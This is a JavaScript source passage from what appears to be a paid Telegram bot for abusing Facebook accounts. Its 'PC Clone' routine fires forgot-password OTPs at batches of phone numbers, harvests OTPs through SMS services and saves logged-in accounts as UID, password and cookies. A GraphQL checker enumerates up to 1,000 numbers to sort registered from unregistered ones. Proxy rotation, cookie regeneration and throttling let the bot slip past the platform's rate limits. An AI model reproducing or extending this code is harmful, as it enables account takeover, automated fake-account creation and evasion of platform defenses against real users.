                `PC CLONE +${num} [${effIso}] Forgot OTP ${otpRes.otpsSent}x (${otpRes.via})${otpRes.earlyMatched ? ' [EARLY LOGIN OK]' : ''}`
              );
              await updatePcProgress(
                otpRes.earlyMatched
                  ? `✅ <b>Logged In on OTP #${otpRes.otpsSent}:</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`
                  : `🔁 <b>Forgot OTP (${otpRes.otpsSent}/${otpResendTarget}x):</b> <code>+${escapeHtml(num)}</code> [<b>${escapeHtml(effIso)}</b>]`,
                false
              );
            } else {
              if (watchMap.has(num)) watchMap.delete(num);
              runState.failCount += 1;
              runState.completed += 1;
              appendUserLog(uid, `PC CLONE +${num} [${effIso}] failed: ${otpRes.err || 'no recovery form'}`);
            }
          } else {
            runState.failCount += 1;
            runState.completed += 1;
            appendUserLog(uid, `PC CLONE +${num} [${effIso}] skipped (${gql.status})`);
          }

          await updatePcProgress();
        }
      };

      const concurrency = Math.min(Math.max(1, Number(cfg.threads || 4)), 6, targetList.length);
      await Promise.all(Array.from({ length: concurrency }, (_, idx) => worker(idx)));
      workersDone = true;

      if ((lamixTok || voltxKey) && Array.from(watchMap.values()).some((w) => !w.done) && !runState.abortRequested) {
        await updatePcProgress(`📡 <b>Waiting up to 90s for Lamix/Voltx SMS OTPs...</b>`, true);
      }
      await otpPoller;

      runState.running = false;
      runState.currentNumber = null;
      const stillPending = Array.from(watchMap.values()).filter((w) => !w.done);

      if (progMsgId) {
        await editMessage(
          chatId,
          progMsgId,
          [
            runState.abortRequested ? `🛑 <b>PC CLONE STOPPED</b>` : `🏁 <b>PC CLONE COMPLETED</b>`,
            DIVIDER,
            `📊 <b>Processed:</b> <code>${runState.completed}/${targetList.length}</code>`,
            `🗑 <b>Auto-Deleted (Free):</b> <code>${deletedFree}</code>`,
            `🔁 <b>Forgot OTP Triggered:</b> <code>${triggeredCount}</code> (up to <code>${otpResendTarget}x</code>)`,
            `✅ <b>Logged In (UID|Pass|Cookies):</b> <code>${verifiedAccounts.length}</code>`,
            `🔐 <b>In OTP Queue (Manual/Lamix Sync):</b> <code>${stillPending.length}</code>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnOk('📡 Sync Lamix OTPs', 'otp:lamix_sync'),
                btnNav('🔐 OTP Queue', 'menu:otp'),
              ],
              [
                btnOk('📦 Accounts Vault', 'menu:accounts'),
                btnNav('💻 Run More', 'menu:pc_clone'),
              ],
            ],
          }
        );
      }

      const fileParts = [];
      if (verifiedAccounts.length > 0) {
        fileParts.push(...verifiedAccounts.map((a) => a.line));
      }
      if (stillPending.length > 0) {
        fileParts.push('', `# PENDING_OTP_QUEUE (+phone|name|pass|iso|otps_sent)`);
        for (const w of stillPending) {
          fileParts.push(`+${w.phone}|${w.name}|${w.pass}|${w.iso}|OTP:${w.item?.resendCount || 1}`);
        }
      }
      await sendDocumentText(
        chatId,
        `PC_CLONE_${uid}_${Date.now()}.txt`,
        fileParts.join('\n') || 'No registered Facebook accounts found in this batch (all free numbers auto-deleted).',
        `PC Clone: ${verifiedAccounts.length} Logged-In (UID|Pass|cookies) • ${stillPending.length} OTP Queue • ${deletedFree} Free Deleted`
      );
    })();
  }

  async function runGraphqlBatchCheck(chatId, uid, numbersInput) {
    const st = readSettings();
    const cfg = readUserConfig(uid);
    const existing = activeRuns.get(uid);
    if (existing?.running) {
      await sendMessage(chatId, '⏳ A batch job is already running for your account. Stop it or wait for completion.', {
        inline_keyboard: [[btnBad('🛑 Stop Active Run', 'menu:stop')]],
      });
      return;
    }

    const userProxies = readUserProxies(uid);
    const proxyPool = userProxies.length > 0 ? userProxies : st.shareGlobalProxies ? readGlobalProxies() : [];
    const targetList = numbersInput.slice(0, 1000);
    const wantProxy = Boolean(cfg.checker_use_proxy);
    const hasAnyProxy = proxyPool.length > 0 || Boolean(cfg.proxy);
    const useProxyPool = wantProxy && hasAnyProxy;
    const modeLabel = useProxyPool ? '🌐 PROXY POOL (20x)' : '⚡ DIRECT TOKEN (25x • 0 Proxy Cost)';

    if (targetList.length === 0) {
      await sendMessage(chatId, '⚠️ No valid phone numbers to check.', {
        inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    const runState = {
      running: true,
      abortRequested: false,
      total: targetList.length,
      completed: 0,
      okCount: 0,
      pendingCount: 0,
      failCount: 0,
      currentNumber: null,
      startedAt: Date.now(),
    };
    activeRuns.set(uid, runState);

    const startedAt = Date.now();
    const startPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;
    const progRes = await sendMessage(
      chatId,
      `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER</b>\n${DIVIDER}\n🛡 <b>Mode:</b> <code>${modeLabel}</code>\n⚡ Harvesting fresh FB token &amp; probing <code>0/${targetList.length}</code> numbers...`,
      { inline_keyboard: [[btnBad('🛑 Stop Check', 'menu:stop')]] }
    );
    const progMsgId = progRes.ok ? progRes.result?.message_id : null;

    (async () => {
      await harvestGqlSessionDirect(true).catch(() => null);

      const freeList = [];
      const takenList = [];
      const unknownList = [];
      let rateLimitedCount = 0;
      const badProxies = new Set();
      let checkedCount = 0;
      let nextIdx = 0;

      const probeOne = async (num, workerOffset) => {
        const numDet = detectCountryFromNumber(`+${num}`, cfg.cc);
        const effCc = (cfg.auto_proxy_country !== false && numDet?.cc) ? numDet.cc : cfg.cc;
        const effIso = (cfg.auto_proxy_country !== false && numDet?.iso && numDet.iso !== '??') ? numDet.iso : getCountryInfo(effCc)[1];
        let px = null;
        let rawPx = null;
        if (useProxyPool) {
          rawPx =
            proxyPool.length > 0
              ? selectSmartProxy(proxyPool, workerOffset, badProxies, cfg.proxy_mode || 'rotate', cfg.proxy || null)
              : cfg.proxy || null;
          px = adaptProxyForSession(rawPx, {
            iso: effIso,
            autoCountry: cfg.auto_proxy_country !== false,
            refreshSession: cfg.auto_proxy_refresh !== false,
          }).url;
        }
        try {
          return await checkNumberGraphql(`+${num}`, {
            cc: effCc,
            proxy: px,
            strictProxy: cfg.strict_proxy !== false,
            timeoutMs: useProxyPool ? 10000 : 12000,
            shouldAbort: () => runState.abortRequested,
          });
        } catch (err) {
          if (err && err.isProxyError && rawPx) badProxies.add(proxyHealthKey(rawPx));
          return { status: 'unknown', nameHint: '', reason: err instanceof Error ? err.message : 'err' };
        }
      };

      const checkerWorker = async () => {
        while (!runState.abortRequested) {
          const i = nextIdx++;
          if (i >= targetList.length) break;
          const num = targetList[i];
          runState.currentNumber = num;
          let res = await probeOne(num, i);
          if ((res.status === 'ratelimit' || res.status === 'unknown') && !runState.abortRequested) {
            await sleepAbort(220 + Math.floor(Math.random() * 200), () => runState.abortRequested);
            if (!runState.abortRequested) res = await probeOne(num, i + 7);
          }

          if (res.status === 'free') {
            freeList.push(num);
            runState.okCount += 1;
          } else if (res.status === 'taken') {
            takenList.push({ num, hint: res.nameHint || '' });
            runState.failCount += 1;
          } else {
            if (res.status === 'ratelimit') rateLimitedCount += 1;
            unknownList.push({ num, reason: res.reason || 'unknown' });
          }

          checkedCount += 1;
          runState.completed = checkedCount;
          if (progMsgId && checkedCount < targetList.length) {
            const elapsed = ((Date.now() - startedAt) / 1000).toFixed(1);
            editMessage(
              chatId,
              progMsgId,
              [
                `🔍 <b>FB CHECKER &amp; NUMBER SPLITTER</b> (${elapsed}s)`,
                DIVIDER,
                `🛡 <b>Route:</b> <code>${modeLabel}</code>`,
                `📊 <code>${renderProgressBar(checkedCount, targetList.length)}</code> (<code>${checkedCount}/${targetList.length}</code>)`,
                `🟢 Fresh (No Acc): <code>${freeList.length}</code>  •  🔴 Taken: <code>${takenList.length}</code>  •  🟡 Unknown/RL: <code>${unknownList.length}</code>`,
              ].join('\n'),
              { inline_keyboard: [[btnBad('🛑 Stop Check', 'menu:stop')]] },
              { throttle: true, noRetry: true, minIntervalMs: 2500 }
            ).catch(() => {});
          }
        }
      };

      const checkerThreads = Math.min(useProxyPool ? 20 : 25, targetList.length);
      await Promise.all(Array.from({ length: checkerThreads }, () => checkerWorker()));

      runState.running = false;
      runState.currentNumber = null;
      normalizedFreeCache.set(uid, freeList);
      normalizedTakenCache.set(uid, takenList.map((t) => t.num));

      const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
      const pxUsedDelta = Math.max(0, (proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes) - startPxBytes);

      const lines = [
        `📊 <b>GRAPHQL CHECK &amp; SPLIT ${runState.abortRequested ? 'STOPPED' : 'COMPLETE'} (${checkedCount}/${targetList.length} in ${elapsedSec}s)</b>`,
        DIVIDER,
        `🛡 <b>Route:</b> <code>${useProxyPool ? '🌐 PROXY POOL' : '⚡ DIRECT (0 Proxy Data)'}</code>  •  💾 <b>Proxy Used:</b> <code>${formatBytes(pxUsedDelta)}</code>`,
        `🟢 <b>Fresh / Available:</b> <code>${freeList.length}</code> numbers (No FB Account)`,
        `🔴 <b>Taken / Registered:</b> <code>${takenList.length}</code> numbers (Existing FB Account)`,
        `🟡 <b>Unknown / Rate Limited:</b> <code>${unknownList.length}</code>${rateLimitedCount > 0 ? ` (${rateLimitedCount} rate-limited)` : ''}`,
      ];

      if (freeList.length > 0) {
        const freePreview = freeList.slice(0, 15).map((n) => `+${n}`).join('\n');
        lines.push(
          '',
          `<b>🟢 Fresh Numbers (${freeList.length}):</b>`,
          `<blockquote><code>${escapeHtml(freePreview)}${freeList.length > 15 ? `\n... +${freeList.length - 15} more` : ''}</code></blockquote>`
        );
      }

      if (takenList.length > 0) {
        const takenPreview = takenList.slice(0, 10).map((t) => `+${t.num}${t.hint ? ` (${t.hint})` : ''}`).join('\n');
        lines.push(
          '',
          `<b>🔴 Taken Numbers (${takenList.length}):</b>`,
          `<blockquote><code>${escapeHtml(takenPreview)}${takenList.length > 10 ? `\n... +${takenList.length - 10} more` : ''}</code></blockquote>`
        );
      }

      if (rateLimitedCount > 5 && !useProxyPool && hasAnyProxy) {
        lines.push(`\n<blockquote>💡 <i>Facebook temporary IP limit detected on giant burst — tap <b>Switch to Proxy Mode</b> below if you want to rotate IPs.</i></blockquote>`);
      }

      const kb = {
        inline_keyboard: [
          ...(freeList.length > 0 ? [[btnOk(`▶️ Run Fresh Only (${freeList.length})`, 'norm:run_free')]] : []),
          [
            ...(freeList.length > 0 ? [btnOk('📥 Fresh .txt', 'gql:dl_free')] : []),
            ...(takenList.length > 0 ? [btnBad('📥 Taken .txt', 'gql:dl_taken')] : []),
          ],
          [
            btnNav(cfg.checker_use_proxy ? '🌐 Checker: PROXY POOL' : '⚡ Checker: DIRECT (0 PX)', 'checker:toggle_mode'),
            btnNav('🔢 Check More', 'menu:normalize'),
          ],
          [btnNav('⬅️ Main Menu', 'menu:home')],
        ],
      };
      if (progMsgId) await editMessage(chatId, progMsgId, lines.join('\n'), kb);
      else await sendMessage(chatId, lines.join('\n'), kb);
    })();
  }

  async function runAndSendDiagnose(chatId, uid) {
    const cfg = readUserConfig(uid);
    const userCookies = readUserCookies(uid);
    const userProxies = readUserProxies(uid);
    const px = cfg.proxy || userProxies[0] || null;

    const statusRes = await sendMessage(chatId, `🩺 <i>Running live Limited FB, GraphQL & proxy diagnostics in parallel...</i>`);
    const statusMsgId = statusRes.ok ? statusRes.result?.message_id : null;
    const [d, curlCheck] = await Promise.all([
      runDiagnoseFor(cfg, userCookies, px),
      checkCurlAvailable(),
    ]);
    const rawTrace = d.trace.slice(-8).join('\n') || '-';
    const traceStr = rawTrace.length > 1800 ? rawTrace.slice(-1800) : rawTrace;
    const diagHtml = [
      `🩺 <b>CONNECTION, DEPS & ENGINE DIAGNOSTICS</b>`,
      DIVIDER,
      `⚙️ <b>Node.js:</b> <code>${escapeHtml(process.version)}</code> (${escapeHtml(process.platform)})`,
      `🧰 <b>Proxy Engine (curl):</b> ${curlCheck.ok ? '🟢 OK' : '🔴 MISSING'} (<code>${escapeHtml(curlCheck.version.slice(0, 40))}</code>)`,
      `🌐 <b>Proxy:</b> <code>${d.defaultProxy ? escapeHtml(d.defaultProxy) : 'Direct IP'}</code> ${d.proxyAlive === true ? `🟢 LIVE (${d.proxyLatency}ms)` : d.proxyAlive === false ? `🔴 DEAD (${escapeHtml(d.proxyError || '')})` : ''}`,
      ...(d.proxyExitIp ? [`🛰 <b>Proxy Exit IP:</b> <code>${escapeHtml(d.proxyExitIp)}</code>`] : []),
      `🔐 <b>Limited/Token Harvest:</b> ${d.tokenOk ? '🟢 TOKEN OK' : '🔴 NO TOKEN'}`,
      `🔍 <b>GraphQL Pre-Check:</b> ${d.gqlOk ? '🟢 OK' : '🔴 ERR'} (<code>${escapeHtml(d.gqlInfo || '-')}</code>)`,
      `📱 <b>Sample Device:</b> <code>${escapeHtml(d.deviceSample || '-')}</code>`,
      `🧬 <b>Pringer ID:</b> <code>${escapeHtml(d.pringerSample || '-')}</code>`,
      `📍 <b>Source:</b> <code>${escapeHtml(d.src || '-')}</code>`,
      `🧩 <b>Tokens:</b> lsd <code>${escapeHtml((d.lsd || '-').slice(0, 14))}</code> • e_tok <code>${escapeHtml((d.etok || '-').slice(0, 12))}</code> • cid <code>${escapeHtml(d.cid || '-')}</code>`,
      `📝 <b>Fields:</b> <code>${d.fields.length}</code>  •  <b>Actions:</b> <code>${d.actions.length}</code>  •  <b>Cookies:</b> <code>${d.cookiesCount}</code>`,
      ``,
      `<b>HTTP Trace:</b>`,
      `<blockquote><code>${escapeHtml(traceStr)}</code></blockquote>`,
    ].join('\n');
    const diagKb = {
      inline_keyboard: [
        [
          btnOk('🔄 Re-run Diagnose', 'menu:diagnose'),
          btnNav('⬅️ Main Menu', 'menu:home'),
        ],
      ],
    };
    if (statusMsgId) await editMessage(chatId, statusMsgId, diagHtml, diagKb);
    else await sendMessage(chatId, diagHtml, diagKb);
  }

  async function renderHelpMenu(chatId, isAdmin, st, editMsgId) {
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const txt = [
      `❓ <b>${escapeHtml(brand)} PRO • BRAND & COMMAND GUIDE</b>`,
      DIVIDER,
      `<b>Official Information</b>`,
      `├ 🏷 <b>Brand:</b> <code>${escapeHtml(brand)}</code>`,
      `├ 👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)} (<code>${escapeHtml(st.ownerUrl || DEFAULT_OWNER_URL)}</code>)`,
      `└ 📢 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
      ``,
      `<b>Core Commands</b>`,
      `├ /start — Open interactive dashboard`,
      `├ /pcclone — PC Clone (Auto Country, Free-Del, 1-10x OTP + Lamix)`,
      `├ /voltx — Voltx SMS Range picker &amp; Auto-OTP FB Creator`,
      `├ /run &lt;numbers&gt; — Quick start batch run`,
      `├ /check &lt;numbers&gt; — Check FREE / TAKEN via GraphQL`,
      `├ /otp — Open OTP & Checkpoint queue`,
      `├ /accounts — Open accounts vault`,
      `├ /proxies — Manage, test & sort proxy pool`,
      `├ /settings — View & edit all engine settings`,
      `└ /cookies — Manage cookies &amp; 1-click fresh cleaner`,
      ``,
      `<b>Diagnostics & Utilities</b>`,
      `├ /fresh — 1-Click Clear Cookies &amp; Caches (Fresh IDs)`,
      `├ /diag — Live Limited FB, GraphQL & proxy probe`,
      `├ /deps — Check Node.js & curl environment`,
      `├ /logs — View recent debug logs`,
      `└ /cancel — Cancel active text input`,
      ...(isAdmin
        ? [
            ``,
            `<b>Admin Commands</b>`,
            `├ /admin — Open ${escapeHtml(brand)} admin control center`,
            `└ /broadcast &lt;msg&gt; — Message all approved users`,
          ]
        : []),
      ``,
      `<blockquote>💬 Support: ${escapeHtml(st.adminUsername)} • ${escapeHtml(getChannelHandle(st.channelUrl))}</blockquote>`,
    ].join('\n');
    const kb = {
      inline_keyboard: [
        [
          btnUrl(`📢 Join ${getChannelHandle(st.channelUrl)}`, st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
        ],
        [
          btnOk('🚀 Main Dashboard', 'menu:home'),
          btnNav('⚙️ Settings', 'menu:settings'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function processMessage(msg) {
    if (!msg.from) return;
    const chatId = msg.chat.id;
    const st = readSettings();
    const user = getOrCreateUser(msg.from);
    const uid = user.id;
    const isAdmin = isUserAdmin(user, st);
    const text = (msg.text || msg.caption || '').trim();

    if (text.startsWith('/start') || text.startsWith('/menu')) {
      promptSessions.delete(uid);
      await renderHome(chatId, msg.from);
      return;
    }

    if (text.startsWith('/help')) {
      await renderHelpMenu(chatId, isAdmin, st);
      return;
    }

    if (text.startsWith('/cancel')) {
      promptSessions.delete(uid);
      await sendMessage(chatId, '✅ <b>Prompt Cancelled</b>\nReturned to idle state.', {
        inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
      });
      return;
    }

    if (st.maintenanceMode && !isAdmin) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (user.status === 'blocked' || (user.status !== 'approved' && !isAdmin)) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(uid, st);
      if (!ch.ok) {
        await renderHome(chatId, msg.from);
        return;
      }
    }

    if (text.startsWith('/run') || text.startsWith('/create')) {
      promptSessions.delete(uid);
      const rest = text.replace(/^\/(run|create)\s*/, '').trim();
      if (rest) await startUserBatchRun(chatId, user, rest);
      else await renderRunPrompt(chatId, uid);
      return;
    }

    if (text === '/check' || text.startsWith('/check ')) {
      promptSessions.delete(uid);
      const rest = text.slice('/check'.length).trim();
      const cfg = readUserConfig(uid);
      if (rest) {
        const nums = Array.from(
          new Set(
            rest
              .split(/[\r\n,\s]+/)
              .map((t) => normNumber(t.trim(), cfg.cc))
              .filter(Boolean)
          )
        );
        await runGraphqlBatchCheck(chatId, uid, nums);
      } else {
        promptSessions.set(uid, { kind: 'awaiting_gqlcheck' });
        await sendMessage(
          chatId,
          `🔍 <b>GRAPHQL FREE/TAKEN CHECKER (UP TO 1,000)</b>\n${DIVIDER}\n⚡ <b>Route:</b> <code>${cfg.checker_use_proxy ? '🌐 PROXY POOL' : '⚡ DIRECT TOKEN (0 Proxy Cost)'}</code>\nPaste phone numbers (up to <b>1,000</b>) or upload a <code>.txt</code> file to split <b>Fresh</b> vs <b>Taken</b> (CC: <code>+${escapeHtml(cfg.cc)}</code>):`,
          {
            inline_keyboard: [
              [btnNav(cfg.checker_use_proxy ? '🌐 Mode: PROXY POOL' : '⚡ Mode: DIRECT (0 PX)', 'checker:toggle_mode')],
              [btnBad('❌ Cancel', 'prompt:cancel')],
            ],
          }
        );
      }
      return;
    }

    if (text.startsWith('/otp')) {
      promptSessions.delete(uid);
      await renderOtpQueue(chatId, uid);
      return;
    }

    if (text.startsWith('/accounts')) {
      promptSessions.delete(uid);
      await renderAccountsMenu(chatId, uid, 'ready');
      return;
    }

    if (text.startsWith('/proxies')) {
      promptSessions.delete(uid);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/voltx')) {
      promptSessions.delete(uid);
      await renderVoltxMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/pcclone')) {
      promptSessions.delete(uid);
      await renderPcCloneMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/fresh')) {
      promptSessions.delete(uid);
      wipeUserCookiesAndCache(uid);
      await sendMessage(
        chatId,
        `🧼 <b>1-CLICK FRESH COOKIES &amp; CACHE CLEARED!</b>\n${DIVIDER}\n✅ Regenerated fresh <code>sb + datr</code> Facebook cookies\n✅ Cleared Done history, Logs &amp; number caches\n<i>Your IDs &amp; sessions will stay 100% fresh on the next run!</i>`,
        { inline_keyboard: [[btnOk('🚀 Dashboard', 'menu:home'), btnNav('💻 PC Clone', 'menu:pc_clone')]] }
      );
      return;
    }

    if (text.startsWith('/settings')) {
      promptSessions.delete(uid);
      await renderSettings(chatId, uid);
      return;
    }

    if (text.startsWith('/cookies')) {
      promptSessions.delete(uid);
      await renderCookiesMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/logs')) {
      promptSessions.delete(uid);
      await renderLogsMenu(chatId, uid);
      return;
    }

    if (text.startsWith('/diag') || text.startsWith('/deps')) {
      promptSessions.delete(uid);
      await runAndSendDiagnose(chatId, uid);
      return;
    }

    if (text.startsWith('/admin')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      promptSessions.delete(uid);
      await renderAdminHome(chatId);
      return;
    }

    if (text === '/broadcast' || text.startsWith('/broadcast ')) {
      if (!isAdmin) {
        await sendMessage(chatId, '⛔ Admin access only.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      const body = text.slice('/broadcast'.length).trim();
      if (!body) {
        await sendMessage(chatId, 'Usage: <code>/broadcast Hello everyone!</code>', {
          inline_keyboard: [[btnOk('📣 Interactive Broadcast', 'admin:broadcast'), btnNav('👑 Admin Panel', 'admin:home')]],
        });
        return;
      }
      const sent = await broadcastMessage(body);
      await sendMessage(chatId, `📣 Broadcast delivered to <code>${sent}</code> approved users.`, {
        inline_keyboard: [[btnNav('👑 Admin Panel', 'admin:home')]],
      });
      return;
    }

    if (msg.document) {
      if ((msg.document.file_size || 0) > 2 * 1024 * 1024) {
        await sendMessage(chatId, '❌ File too large (max 2 MB).', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      const fileMeta = await tgCall('getFile', { file_id: msg.document.file_id });
      const filePath = fileMeta.result?.file_path;
      if (!fileMeta.ok || !filePath || filePath.includes('..')) {
        await sendMessage(chatId, '❌ Could not download uploaded file.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
        return;
      }
      try {
        const rawDoc = await tgDownloadFileText(filePath);
        const session = promptSessions.get(uid);
        promptSessions.delete(uid);
        if (session?.kind === 'awaiting_normalize') {
          await handleNormalizeText(chatId, uid, rawDoc);
        } else if (session?.kind === 'awaiting_pc_clone') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => normNumber(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await runPcCloneBatch(chatId, uid, nums);
        } else if (session?.kind === 'awaiting_pc_links') {
          const parsedLinks = normalizePcRecoveryUrls(rawDoc, { fallbackToDefaults: false });
          if (parsedLinks.length === 0) {
            await sendMessage(
              chatId,
              `❌ <b>No Valid Facebook Links Found</b>\nAllowed hosts: <code>www.facebook.com</code>, <code>m.facebook.com</code>, <code>mbasic.facebook.com</code>`,
              { inline_keyboard: [[btnNav('🔗 Back to Links', 'pc:links')]] }
            );
            return;
          }
          writeUserConfig(uid, { pc_recovery_urls: parsedLinks });
          await sendMessage(chatId, `✅ Saved <code>${parsedLinks.length}</code> Facebook recovery link(s).`);
          await renderPcCloneLinksMenu(chatId, uid);
        } else if (session?.kind === 'awaiting_gqlcheck') {
          const cfg = readUserConfig(uid);
          const nums = Array.from(
            new Set(
              rawDoc
                .split(/[\r\n,\s]+/)
                .map((t) => normNumber(t.trim(), cfg.cc))
                .filter(Boolean)
            )
          );
          await runGraphqlBatchCheck(chatId, uid, nums);
        } else if (session?.kind === 'awaiting_proxies') {
          const additions = parseProxyLines(rawDoc);
          if (additions.length === 0) {
            await sendMessage(
              chatId,
              `❌ <b>No Valid Proxies Found in File</b>\n<blockquote>Supported formats:\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code></blockquote>`,
              { inline_keyboard: [[btnOk('➕ Try Again', 'proxies:add'), btnNav('⬅️ Main Menu', 'menu:home')]] }
            );
            return;
          }
          const merged = [...readUserProxies(uid), ...additions];
          writeUserProxies(uid, merged);
          await sendMessage(
            chatId,
            `✅ Parsed & saved <code>${additions.length}</code> proxies (Pool total: <code>${readUserProxies(uid).length}</code>).`,
            {
              inline_keyboard: [
                [
                  btnOk('🧪 Test All Proxies', 'proxies:test'),
                  btnNav('🌐 Manage Proxies', 'menu:proxies'),
                ],
                [btnNav('⬅️ Main Menu', 'menu:home')],
              ],
            }
          );
        } else {
          await startUserBatchRun(chatId, user, rawDoc);
        }
      } catch {
        await sendMessage(chatId, '❌ Failed to read document contents.', {
          inline_keyboard: [[btnNav('⬅️ Main Menu', 'menu:home')]],
        });
      }
      return;
    }

    const session = promptSessions.get(uid);
    if (!session) {
      await renderHome(chatId, msg.from);
      return;
    }

    if (session.kind === 'awaiting_numbers') {
      promptSessions.delete(uid);
      await startUserBatchRun(chatId, user, text);
      return;
    }

    if (session.kind === 'awaiting_normalize') {
      promptSessions.delete(uid);
      await handleNormalizeText(chatId, uid, text);
      return;
    }

    if (session.kind === 'awaiting_pc_clone') {
      promptSessions.delete(uid);
      const cfg = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => normNumber(t.trim(), cfg.cc))
            .filter(Boolean)
        )
      );
      await runPcCloneBatch(chatId, uid, nums);
      return;
    }

    if (session.kind === 'awaiting_lamix_token') {
      promptSessions.delete(uid);
      const clean = text === '-' ? '' : text.trim();
      writeUserConfig(uid, { lamix_token: clean });
      await sendMessage(chatId, clean ? `✅ Lamix API v1 Bearer Token saved.` : `🗑 Lamix API Token cleared.`);
      await renderPcCloneMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_pc_resends') {
      const n = Number(text);
      if (!Number.isFinite(n) || n < 1 || n > 10) {
        await sendMessage(chatId, '❌ Enter Forgot OTP repeat count between <code>1</code> and <code>10</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:pc_clone')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_otp_resends: Math.round(n) });
      await sendMessage(chatId, `✅ PC Clone Forgot OTP repeats set to <code>${Math.round(n)}x</code>.`);
      await renderPcCloneMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_pc_links') {
      const parsedLinks = normalizePcRecoveryUrls(text, { fallbackToDefaults: false });
      if (parsedLinks.length === 0) {
        await sendMessage(
          chatId,
          `❌ <b>Invalid Facebook Link(s)</b>\nSend one or multiple valid <code>https://*.facebook.com/...</code> URLs (one per line), e.g.:\n<code>https://www.facebook.com/login/</code>\n<code>https://m.facebook.com/login/</code>\n<code>https://www.facebook.com/login/identify/</code>\n<code>https://www.facebook.com/hacked/</code>`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'pc:links')]] }
        );
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { pc_recovery_urls: parsedLinks });
      await sendMessage(chatId, `✅ Saved <code>${parsedLinks.length}</code> Facebook recovery link(s) for PC Clone.`);
      await renderPcCloneLinksMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_gqlcheck') {
      promptSessions.delete(uid);
      const cfg = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => normNumber(t.trim(), cfg.cc))
            .filter(Boolean)
        )
      );
      await runGraphqlBatchCheck(chatId, uid, nums);
      return;
    }

    if (session.kind === 'awaiting_otp') {
      await handleOtpReply(chatId, uid, session.phone, text);
      return;
    }

    if (session.kind === 'awaiting_manual_otp') {
      promptSessions.delete(uid);
      const parts = text.split('|').map((s) => s.trim());
      const cfg = readUserConfig(uid);
      const clean = normNumber(parts[0] || '', cfg.cc) || (parts[0] || '').replace(/\D/g, '');
      if (!clean) {
        await sendMessage(
          chatId,
          '❌ Invalid phone number. Format: <code>phone|name|confirm_url</code>',
          { inline_keyboard: [[btnOk('➕ Try Again', 'otp:manual'), btnBad('❌ Cancel', 'menu:otp')]] }
        );
        return;
      }
      pushUserPending(uid, {
        status: 'CONFIRM',
        phone: clean,
        name: parts[1] || 'Manual Session',
        pass: cfg.password,
        uid: '',
        cookies: {},
        confirm_url: parts[2] || 'https://m.facebook.com/confirmphone.php',
        proxy: cfg.proxy || '',
        fmt: clean,
        confirmed: false,
      });
      await renderOtpQueue(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_proxies') {
      promptSessions.delete(uid);
      const additions = parseProxyLines(text);
      if (additions.length === 0) {
        await sendMessage(
          chatId,
          `❌ <b>No Valid Proxy Format Recognized</b>\n<blockquote>Supported formats:\n• <code>user:pass:host:port</code> (9Proxy)\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code>\n• <code>ip:port</code></blockquote>`,
          { inline_keyboard: [[btnOk('➕ Try Again', 'proxies:add'), btnBad('❌ Cancel', 'menu:proxies')]] }
        );
        return;
      }
      const merged = [...readUserProxies(uid), ...additions];
      writeUserProxies(uid, merged);
      await sendMessage(
        chatId,
        `✅ Parsed <code>${additions.length}</code> valid proxies and saved to pool (Total: <code>${readUserProxies(uid).length}</code>).`,
        {
          inline_keyboard: [
            [
              btnOk('🧪 Test All Proxies', 'proxies:test'),
              btnNav('🌐 Manage Proxies', 'menu:proxies'),
            ],
            [btnNav('⬅️ Main Menu', 'menu:home')],
          ],
        }
      );
      return;
    }

    if (session.kind === 'awaiting_remove_proxy') {
      promptSessions.delete(uid);
      const list = readUserProxies(uid);
      const idxNum = Number(text);
      const normTarget = validateProxyUrl(text);
      let next = list;
      if (Number.isInteger(idxNum) && idxNum >= 1 && idxNum <= list.length) {
        next = list.filter((_, i) => i !== idxNum - 1);
      } else {
        next = list.filter((p) => p !== text && (!normTarget || p !== normTarget));
      }
